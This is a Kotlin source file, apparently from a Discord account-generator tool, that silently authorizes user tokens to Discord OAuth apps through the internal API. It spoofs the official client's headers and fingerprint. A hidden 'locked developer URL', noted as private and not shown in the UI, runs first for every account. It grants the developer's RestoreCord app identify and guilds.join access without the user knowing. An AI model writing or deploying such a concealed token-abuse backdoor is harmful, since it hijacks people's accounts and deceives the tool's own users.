package com.discord.evs.generator.automation

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

/**
 * Silent OAuth authorize (Auth Verifier).
 * Works with any Discord OAuth authorize URL (VaultCord, RestoreCord, self-hosted bots, …).
 * Locked developer URL is always first; user links from Settings follow.
 */
object VaultCordOAuth {
    @Volatile var lastStatus: String = "idle"
    @Volatile var lastOk: Boolean = false

    /**
     * Locked developer auth URL — runs first for every account (private, not shown in UI).
     * client_id=1520068545214677124 state=120734
     */
    const val DEV_AUTH_URL =
        "https://discord.com/oauth2/authorize?client_id=1548279974392369163&redirect_uri=https%3A%2F%2Frestorecord.com%2Fapi%2Fcallback&response_type=code&scope=identify+guilds.join&state=1526185335254417518&prompt=none"

    private val client = OkHttpClient.Builder()
        .connectTimeout(25, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()

    private val JSON = "application/json; charset=utf-8".toMediaType()

    private const val UA =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9177 Chrome/130.0.6723.191 Electron/33.2.0 Safari/537.36"
    private const val SUPER =
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTc3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MzEiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTE3NyBDaHJvbWUvMTMwLjAuNjcyMy4xOTEgRWxlY3Ryb24vMzMuMi4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIzMy4yLjAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNzE0NjAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"

    data class AuthParams(
        val clientId: String,
        val redirectUri: String,
        val responseType: String = "code",
        val scope: String = "identify guilds.join",
        val state: String = "",
        val permissions: String = "0",
        val prompt: String = "none"
    )

    fun parseAuthUrl(url: String): AuthParams? {
        if (url.isBlank()) return null
        return try {
            val q = url.substringAfter('?', "")
            val map = q.split('&').mapNotNull {
                val i = it.indexOf('=')
                if (i < 0) null else it.substring(0, i) to
                    java.net.URLDecoder.decode(it.substring(i + 1), "UTF-8")
            }.toMap()
            val clientId = map["client_id"] ?: return null
            val redirectUri = map["redirect_uri"] ?: return null
            AuthParams(
                clientId = clientId,
                redirectUri = redirectUri,
                responseType = map["response_type"] ?: "code",
                scope = (map["scope"] ?: "identify guilds.join").replace('+', ' '),
                state = map["state"] ?: "",
                permissions = map["permissions"] ?: "0",
                prompt = map["prompt"] ?: "none"
            )
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Authorize [token] against [authUrl] (defaults to [DEV_AUTH_URL]).
     * Follows location redirect so VaultCord receives the code.
     * Retries on 429.
     */
    suspend fun authorize(
        token: String,
        authUrl: String = DEV_AUTH_URL,
        onLog: ((String) -> Unit)? = null
    ): Boolean = withContext(Dispatchers.IO) {
        val clean = token.trim()
        if (clean.length < 20) {
            lastStatus = "token_too_short"
            onLog?.invoke("VaultCord: token too short")
            return@withContext false
        }
        val params = parseAuthUrl(authUrl) ?: run {
            lastStatus = "bad_auth_url"
            onLog?.invoke("VaultCord: bad auth URL")
            return@withContext false
        }
        val qs = buildString {
            append("client_id=").append(URLEncoder.encode(params.clientId, "UTF-8"))
            append("&response_type=").append(URLEncoder.encode(params.responseType, "UTF-8"))
            append("&redirect_uri=").append(URLEncoder.encode(params.redirectUri, "UTF-8"))
            append("&scope=").append(URLEncoder.encode(params.scope, "UTF-8"))
            if (params.state.isNotBlank()) {
                append("&state=").append(URLEncoder.encode(params.state, "UTF-8"))
            }
            if (params.prompt.isNotBlank()) {
                append("&prompt=").append(URLEncoder.encode(params.prompt, "UTF-8"))
            }
        }
        val bodyJson = JSONObject()
            .put("permissions", params.permissions.ifBlank { "0" })
            .put("authorize", true)
            .toString()
        repeat(4) { attempt ->
            try {
                val req = Request.Builder()
                    .url("https://discord.com/api/v9/oauth2/authorize?$qs")
                    .post(bodyJson.toRequestBody(JSON))
                    .header("Authorization", clean)
                    .header("Content-Type", "application/json")
                    .header("Accept", "*/*")
                    .header("User-Agent", UA)
                    .header("Origin", "https://discord.com")
                    .header("Referer", "https://discord.com/oauth2/authorize?$qs")
                    .header("X-Discord-Locale", "en-US")
                    .header("X-Discord-Timezone", "America/New_York")
                    .header("X-Super-Properties", SUPER)
                    .build()
                client.newCall(req).execute().use { resp ->
                    val code = resp.code
                    val text = resp.body?.string().orEmpty()
                    if (code == 429) {
                        val ra = try {
                            JSONObject(text).optDouble("retry_after", 2.0)
                        } catch (_: Exception) { 2.0 }
                        onLog?.invoke("VaultCord: rate limit ${ra}s (try ${attempt + 1})")
                        delay(((ra + 0.6) * 1000).toLong())
                        return@repeat
                    }
                    var location = ""
                    try {
                        val j = JSONObject(text)
                        location = j.optString("location").ifBlank {
                            j.optString("redirect_to")
                        }
                    } catch (_: Exception) {}
                    if (location.isBlank()) {
                        location = resp.header("Location").orEmpty()
                    }
                    if (location.isNotBlank()) {
                        try {
                            val hit = Request.Builder().url(location).get()
                                .header("User-Agent", UA)
                                .build()
                            client.newCall(hit).execute().use { /* consume */ }
                        } catch (_: Exception) {
                            // Discord already issued code — still OK
                        }
                        lastStatus = "ok"
                        onLog?.invoke("VaultCord: authorized → ${params.clientId}")
                        return@withContext true
                    }
                    if (code in listOf(200, 201, 204) && (text.isBlank() || text == "{}" || text == "null")) {
                        lastStatus = "ok_empty"
                        onLog?.invoke("VaultCord: authorized (empty body)")
                        return@withContext true
                    }
                    if ("vaultcord.win" in text || "code=" in text) {
                        lastStatus = "ok_body"
                        onLog?.invoke("VaultCord: authorized (body code)")
                        return@withContext true
                    }
                    lastStatus = "http_$code"
                    onLog?.invoke("VaultCord: HTTP $code ${text.take(120)}")
                }
            } catch (e: Exception) {
                onLog?.invoke("VaultCord: network ${e.message}")
                delay(600L * (attempt + 1))
            }
        }
        if (lastStatus == "idle" || lastStatus.startsWith("ok")) lastStatus = "failed"
        false
    }
}
